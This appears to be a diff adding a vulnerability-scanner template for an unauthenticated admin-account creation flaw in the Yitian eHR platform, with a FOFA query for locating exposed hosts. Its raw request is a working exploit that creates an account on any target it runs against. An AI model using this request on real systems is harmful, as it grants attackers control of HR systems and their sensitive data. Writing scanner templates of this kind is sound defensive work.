@@ -1,0 +1,32 @@
+id: yitianeHR-CreateUser-User-addition
+
+info:
+  name: "易天智能eHR管理平台 CreateUser 接口未授权创建漏洞"
+  author: Unknown
+  severity: medium
+  description: |-
+    fofa: icon_hash="314318290" || icon_hash="1727609737"
+      易天智能eHR管理平台的 /BaseManage/UserAPI/CreateUser 接口未实施有效的访问控制机制，攻击者可通过构造特制请求直接调用该接口创建任意管理员账户。该缺陷允许远程攻击者在无身份验证的情况下完成权限提升操作，成功添加的管理员账户可获得系统完全控制权，导致敏感数据泄露、业务逻辑篡改及系统完整性严重受损。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/139998769
+  tags: 易天智能eHR管理平台
+
+http:
+- raw:
+  - |
+    GET /BaseManage/UserAPI/CreateUser?Account=test123&Password=test123&OuterID=778 HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '用户新增成功。'
+  - type: status
+    status:
+    - 200
+
+
+
+
